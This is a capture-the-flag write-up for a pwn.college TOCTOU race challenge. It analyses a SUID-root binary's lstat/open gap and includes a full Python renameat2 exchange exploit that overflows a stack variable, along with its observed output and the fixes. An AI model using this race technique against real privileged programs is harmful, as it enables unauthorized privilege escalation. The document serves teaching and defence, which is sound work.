# Stage 23: Race Conditions Level 3.1 — TOCTOU Size-Check Bypass

## Module Metadata

| Field | Value |
|-------|-------|
| **Module Name** | Pwn.College — Race Condition |
| **Level** | 3.1 |
| **Estimated Time** | — |
| **Category** | Race Condition / TOCTOU |
| **Platform** | Linux x86-64 |
| **Binary** | `/challenge/babyrace_level3.1` |
| **VT Score** | N/A |

---

## Challenge

`/challenge/babyrace_level3.1` is a SUID-root PIE ELF that accepts a file path. It rejects paths containing `flag`, rejects symbolic links with `lstat()`, rejects files larger than 256 bytes, then opens the path and reads up to 4096 bytes into a 256-byte stack buffer.

The bug is the same file-size TOCTOU as Level 3.0, but the exploitation method is different. Level 3.0 used the program's `getchar()` pauses to rewrite one file after validation. Level 3.1 is raced continuously: two regular files are created, one exactly 256 bytes and one 264 bytes, and `renameat2(RENAME_EXCHANGE)` atomically swaps their directory entries while the target is launched repeatedly.

When the target validates the 256-byte entry and then opens the 264-byte entry, the extra eight bytes overwrite the adjacent `win` variable. The program checks `win`, calls the privileged `win()` function when it is nonzero, and prints the flag.

| Attribute | Details |
|-----------|---------|
| Platform | pwn.college |
| Challenge | Race Conditions Level 3.1 |
| Binary | `/challenge/babyrace_level3.1` |
| Architecture | Linux x86-64 |
| Binary format | ELF 64-bit, PIE |
| Privilege model | SUID root |
| Primary vulnerability | Time-of-check to time-of-use (TOCTOU) |
| Secondary vulnerability | Stack-buffer overflow |
| Exploit technique | Atomic directory-entry exchange |
| System call | `renameat2()` with `RENAME_EXCHANGE` |
| Corrupted variable | `win` |
| Trigger condition | `win != 0` |
| Successful attempt | 3 |
| Result | Successful flag retrieval |

## Initial Reconnaissance

Inspect the binary:

```bash
cd /challenge

file ./babyrace_level3.1
checksec --file=./babyrace_level3.1
ls -l ./babyrace_level3.1
strings -n 4 ./babyrace_level3.1
```

### Security properties

| Property | Status |
|----------|--------|
| Architecture | AMD64 |
| PIE | Enabled |
| Stack canary | Enabled |
| NX | Enabled |
| RELRO | Full |
| SHSTK | Enabled |
| IBT | Enabled |
| SUID | Root |

File permissions:

```text
-rwsr-xr-x 1 root root 17664 Jan 28 2025 babyrace_level3.1
```

The `s` in the owner execute position marks the SUID bit. The binary runs with root's effective privileges when invoked directly, so the `win()` path can read the protected file.

The hardening is real but does not stop this bug. The exploit never overwrites the return address or the canary. It corrupts a data variable that the program deliberately consults before calling `win()`.

### Relevant strings

```text
You win! Here is your flag:
/flag
Your effective user id is not 0!
Error: path contains `flag`!
Error: failed to get file status!
Error: file is a symlink!
Error: file is too large!
```

Those strings reveal the validation logic and the intended success condition.

## Static Analysis

Disassemble `main()`:

```bash
objdump -d -M intel --disassemble=main ./babyrace_level3.1
```

### Path validation

```asm
14f2: lea rsi,[rip+...]
14fc: call strstr@plt
1501: test rax,rax
```

The program checks whether the supplied path contains the string `flag`.

### File metadata validation

```asm
1537: call __lstat
153c: cmp eax,0xffffffff
```

The program obtains file metadata without following symbolic links.

### Symlink validation

```asm
1557: mov eax,DWORD PTR [rbp-0x188]
155d: and eax,0xf000
1562: cmp eax,0xa000
```

`0xf000` is the file-type mask and `0xa000` is the symbolic-link type, so the program rejects symlinks at the moment `lstat()` runs.

### File-size validation

```asm
157f: mov rax,QWORD PTR [rbp-0x170]
1586: cmp rax,0x100
158c: jle 15a4
```

The file is rejected if its size exceeds 256 bytes.

### File opening

```asm
15bf: call open@plt
```

The program opens the pathname after validation. The size check and the open are close together, with no interactive pause between them. That is why the exploit races continuously instead of waiting for a prompt.

### Memory read

```asm
15c6: lea rax,[rbp-0x110]
15cd: mov edx,0x1000
15d7: call read@plt
```

This is the critical memory-corruption operation. The destination is the buffer at `[rbp-0x110]`, and the requested length is `0x1000`, or 4096 bytes. The usable buffer size is only 256 bytes.

### Success condition

```asm
15dc: mov rax,QWORD PTR [rbp-0x10]
15e0: test rax,rax
15e3: je 15ef
15ea: call win
```

If the variable at `[rbp-0x10]` is nonzero, the program invokes `win()`.

### Execution sequence

```text
1. Receive pathname
2. Reject pathname containing "flag"
3. Call lstat()
4. Reject symbolic links
5. Validate file size <= 256
6. Call open()
7. Read up to 4096 bytes
8. Check win variable
9. Call win() if nonzero
```

The critical gap is between steps 5 and 6. The filesystem object associated with the pathname can change after validation.

## Stack Layout and Corruption Target

The relevant stack offsets are:

| Stack offset | Purpose |
|--------------|---------|
| `[rbp-0x110]` | Input buffer |
| `[rbp-0x10]` | `win` control variable |
| `[rbp-0x8]` | Stack canary |

The distance from the beginning of the buffer to the `win` variable is:

```text
0x110 - 0x10 = 0x100 = 256 bytes
```

Therefore:

- Bytes 0–255 fill the input buffer.
- Bytes 256–263 overwrite the 8-byte `win` variable.
- The next bytes would reach the stack canary.

The exploit does not need to overwrite the return address or defeat the stack canary. It only needs to make the `win` variable nonzero.

```text
Higher memory addresses
+-----------------------------+
| Stack canary                |
| rbp - 0x8                   |
+-----------------------------+
| win variable (8 bytes)      |
| rbp - 0x10                  |
+-----------------------------+
|                             |
| Input buffer                |
| 256 bytes                   |
|                             |
| rbp - 0x110                 |
+-----------------------------+
Lower memory addresses
```

## Root Cause: TOCTOU

The vulnerability is caused by validating one filesystem object and subsequently reading a potentially different object through the same pathname.

The original challenge source was not captured for this run. The C snippet below is a conceptual reconstruction of the relevant behavior from the disassembly, not a verified source-code copy.

```c title="level-3-1-race.c" keys="3,9,14,18"
struct stat st;

lstat(path, &st);

if (S_ISLNK(st.st_mode)) {
    exit(1);
}

if (st.st_size > 256) {
    puts("Error: file is too large!");
    exit(1);
}

int fd = open(path, O_RDONLY);

char buffer[256];

read(fd, buffer, 4096);
```

The program checks that the pathname currently refers to a small regular file. It then opens the pathname again. It does not keep a descriptor from the validation step, and it does not cap the read at the buffer size.

This allows the program to validate a 256-byte file and subsequently read 264 bytes from a different file.

### Normal execution

```text
File supplied
     |
     v
lstat(path)
     |
     v
File size <= 256
     |
     v
Validation succeeds
     |
     v
open(path)
     |
     v
read()
     |
     v
Buffer receives file contents
```

### Exploitation execution

```text
racefile -> 256-byte file
swapfile -> 264-byte file

Launch target
     |
     v
lstat(racefile) sees 256-byte file
     |
     v
Size check passes
     |
     v
Exchange directory entries
     |
     v
open(racefile) resolves to 264-byte file
     |
     v
read() copies 264 bytes into a 256-byte buffer
     |
     v
win variable becomes nonzero
     |
     v
win() executes
     |
     v
Flag retrieved
```

The pathname never changes. Only the directory entry it resolves to changes.

## Exploitation Strategy

The exploit uses two regular files:

| File | Size | Purpose |
|------|-----:|---------|
| `racefile` | 256 bytes | Passes validation |
| `swapfile` | 264 bytes | Corrupts the `win` variable |

The oversized file contains:

```python
b"A" * 256 + b"WINWIN!!"
```

The first 256 bytes fill the buffer. The final eight bytes overwrite `win`.

The exploit continuously exchanges the two directory entries:

```c title="rename-exchange.c" keys="1,6"
renameat2(
    AT_FDCWD,
    target,
    AT_FDCWD,
    swap,
    RENAME_EXCHANGE
);
```

`RENAME_EXCHANGE` atomically exchanges the two names. That matters because it avoids an intermediate state in which the pathname is missing. The target therefore either sees the 256-byte file or the 264-byte file, never an empty name.

Two racer processes perform the exchange in parallel. That increases the chance that one exchange lands between the target's metadata check and its `open()`.

The target is then launched repeatedly. Each run is an independent chance to win the race. The exploit stops when the output contains `You win!`.

## Complete Proof of Concept

Save the following as `/tmp/exploit31.py`:

```python title="exploit31.py" keys="13,25,43,56,70,73,82,100"
#!/usr/bin/env python3

import os
import signal
import ctypes
import subprocess

BINARY = "/challenge/babyrace_level3.1"
DIRECTORY = "/home/hacker/race"
TARGET = DIRECTORY + "/racefile"
SWAP = DIRECTORY + "/swapfile"

ATTEMPTS = 100000

os.makedirs(DIRECTORY, exist_ok=True)

# Create the file that passes validation.
with open(TARGET, "wb") as f:
    f.write(b"A" * 256)

# Create the oversized file that corrupts win.
with open(SWAP, "wb") as f:
    f.write(b"A" * 256 + b"WINWIN!!")

libc = ctypes.CDLL("libc.so.6", use_errno=True)

libc.renameat2.argtypes = [
    ctypes.c_int,
    ctypes.c_char_p,
    ctypes.c_int,
    ctypes.c_char_p,
    ctypes.c_uint
]

libc.renameat2.restype = ctypes.c_int

AT_FDCWD = -100
RENAME_EXCHANGE = 2

target = TARGET.encode()
swap = SWAP.encode()

def racer():
    while True:
        libc.renameat2(
            AT_FDCWD,
            target,
            AT_FDCWD,
            swap,
            RENAME_EXCHANGE
        )

racers = []

for _ in range(2):
    pid = os.fork()

    if pid == 0:
        racer()
        os._exit(0)

    racers.append(pid)

print("[+] Atomic exchange racers started")
print("[+] Target:", TARGET)
print("[+] Oversized file:", SWAP)
print("[+] Starting exploitation")

try:
    for attempt in range(1, ATTEMPTS + 1):

        try:
            result = subprocess.run(
                [BINARY, TARGET],
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                timeout=2
            )

            output = result.stdout.decode(errors="replace")

            if "You win!" in output:
                print("\n[+] SUCCESS")
                print("[+] Attempt:", attempt)
                print(output)
                break

        except subprocess.TimeoutExpired:
            continue

        if attempt % 1000 == 0:
            print("[*] Attempts:", attempt)

    else:
        print("[-] Attempts exhausted")

finally:
    for pid in racers:
        try:
            os.kill(pid, signal.SIGKILL)
        except ProcessLookupError:
            pass

    for pid in racers:
        try:
            os.waitpid(pid, 0)
        except ChildProcessError:
            pass

    print("[+] Racers stopped")
```

### Execute

```bash
python3 /tmp/exploit31.py
```

## Observed Exploitation Result

The exploit triggered the intended behavior on attempt 3. The observed terminal output was:

```text
[+] Atomic exchange racers started
[+] Target: /home/hacker/race/racefile
[+] Oversized file: /home/hacker/race/swapfile
[+] Starting exploitation

[+] SUCCESS
[+] Attempt: 3
###
### Welcome to /challenge/babyrace_level3.1!
###

You win! Here is your flag:
pwn.college{...}


### Goodbye!

[+] Racers stopped
```

The success message confirms that the overwritten control variable caused the program to invoke `win()`. The live flag value is redacted on this page; the attempt number and output structure are preserved.

Unlike Level 3.0, the observed output has no `Value of "win" variable` line. The program still branches on `[rbp-0x10]`; it simply does not print that value in this version.

## Why the Exploit Worked

The exploit combines two weaknesses.

### Weakness 1 — TOCTOU file validation

The program validates file metadata separately from the operation that consumes the file. The directory entry can be exchanged after the size check and before `open()`.

### Weakness 2 — Incorrect read length

The program allocates a 256-byte buffer but requests up to 4096 bytes. The size validation does not protect the later read because the file can change between validation and use.

The atomic exchange creates the timing window, and the repeated launches provide many independent attempts. The successful run demonstrates that the program read the oversized file after validating the smaller one.

## Level 3.0 vs Level 3.1

| Property | Level 3.0 | Level 3.1 |
|----------|-----------|-----------|
| Target | `babyrace_level3.0` | `babyrace_level3.1` |
| Validation | `lstat()` size check | `lstat()` size check |
| Use | `open()` then `read()` | `open()` then `read()` |
| Synchronization | Two `getchar()` pauses | No prompt; continuous race |
| Race setup | Rewrite one file | Exchange two files |
| Main technique | PTY-driven rewrite | `renameat2(RENAME_EXCHANGE)` |
| Racers | One exploit process | Two exchange processes |
| Observed attempts | One coordinated run | Success on attempt 3 |
| Result | `win()` called | `win()` called |

Level 3.0 makes the race deterministic by pausing the program. Level 3.1 removes that convenience and requires the attacker to win a scheduling race with the filesystem.

## Security Mitigations

### Correct file handling

Avoid validating a pathname and then reopening it. A safer approach is:

1. Open the file once.
2. Use `fstat()` on the opened file descriptor.
3. Validate the opened object's metadata.
4. Read no more than the allocated buffer capacity.

```c title="safe-read-level-3-1.c" keys="4,9,14,19"
struct stat st;
char buffer[256];

int fd = open(path, O_RDONLY | O_NOFOLLOW);

if (fd < 0)
    return -1;

if (fstat(fd, &st) < 0) {
    close(fd);
    return -1;
}

if (st.st_size > sizeof(buffer)) {
    close(fd);
    return -1;
}

ssize_t n = read(fd, buffer, sizeof(buffer));
```

`O_NOFOLLOW` rejects a final-component symlink. `fstat()` validates the descriptor that was actually opened. The read is capped at `sizeof(buffer)`, so a later file-size change cannot overflow the stack buffer.

### Correct read bounds

Instead of:

```c
read(fd, buffer, 4096);
```

use:

```c
read(fd, buffer, sizeof(buffer));
```

The read length must describe the destination, not an unrelated maximum file size.

### Additional protections

- Use descriptor-based file handling.
- Apply `openat2()` restrictions where appropriate.
- Avoid unnecessary SUID binaries.
- Minimize privileges before processing untrusted files.
- Treat filesystem metadata as mutable until the actual file descriptor is secured.

The stack canary, NX, PIE, RELRO, SHSTK, and IBT are useful hardening layers, but none of them address a logic bug that deliberately writes past a buffer into an adjacent variable through a permitted `read()`.

## Key Exploit Development Lessons

1. **TOCTOU:** A security check can become invalid before the checked resource is used.
2. **Atomic filesystem operations:** `RENAME_EXCHANGE` can create highly controlled filesystem races.
3. **Stack layout analysis:** Disassembly can reveal the exact distance between a buffer and an adjacent variable.
4. **Read-length vulnerabilities:** A large read request into a smaller buffer can corrupt adjacent stack memory.
5. **Control-variable corruption:** Not every successful memory-corruption exploit requires return-address control.
6. **Race reliability:** Repeated execution and parallel racers can turn a timing-dependent vulnerability into a practical exploit.

## Final Results

| Property | Result |
|----------|--------|
| Challenge | pwn.college Race Conditions Level 3.1 |
| Binary | `babyrace_level3.1` |
| Binary permissions | SUID root |
| Architecture | x86-64 |
| Primary vulnerability | TOCTOU |
| Secondary vulnerability | Stack-buffer overflow |
| Validation function | `lstat()` |
| File-opening function | `open()` |
| Read function | `read()` |
| Validated maximum size | 256 bytes |
| Actual read limit | 4096 bytes |
| Oversized input | 264 bytes |
| Overflow length | 8 bytes |
| Corrupted variable | `win` |
| Trigger condition | `win != 0` |
| Successful attempt | 3 |
| Result | Successful |

## Conclusion

Level 3.1 demonstrates a practical combination of a TOCTOU race condition and stack-based memory corruption.

The program trusted file metadata obtained through `lstat()`, but later opened and read the pathname without ensuring that the underlying file remained unchanged. By atomically exchanging a valid 256-byte file with a 264-byte file, the exploit bypassed the size check and overwrote the adjacent `win` variable.

The challenge was successfully exploited on the third attempt, resulting in execution of the privileged `win()` function and retrieval of the flag.
